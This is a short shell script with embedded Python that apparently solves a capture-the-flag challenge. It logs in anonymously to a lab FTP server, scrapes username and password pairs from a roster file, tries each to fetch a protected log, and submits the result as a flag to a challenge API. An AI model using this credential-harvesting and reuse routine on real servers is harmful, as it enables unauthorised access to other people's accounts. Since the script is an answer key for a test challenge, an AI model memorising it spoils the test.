#!/bin/sh
set -eu

HOST=172.20.0.141
FLAG="$(python3 - "$HOST" <<'PY'
import ftplib
import io
import re
import sys

host = sys.argv[1]
ftp = ftplib.FTP(host, timeout=5)
ftp.login()
roster = io.BytesIO()
ftp.retrbinary("RETR roster.txt", roster.write)
text = roster.getvalue().decode()

for username, password in re.findall(r"User:\s*(\S+)\s+Password:\s*(\S+)", text):
    candidate = ftplib.FTP(host, timeout=5)
    try:
        candidate.login(username, password)
        result = io.BytesIO()
        candidate.retrbinary("RETR relay.log", result.write)
        print(result.getvalue().decode().strip())
        candidate.quit()
        break
    except ftplib.all_errors:
        try:
            candidate.quit()
        except ftplib.all_errors:
            pass
else:
    raise SystemExit("No candidate account provided the relay fragment")
ftp.quit()
PY
)"

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-003f19\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
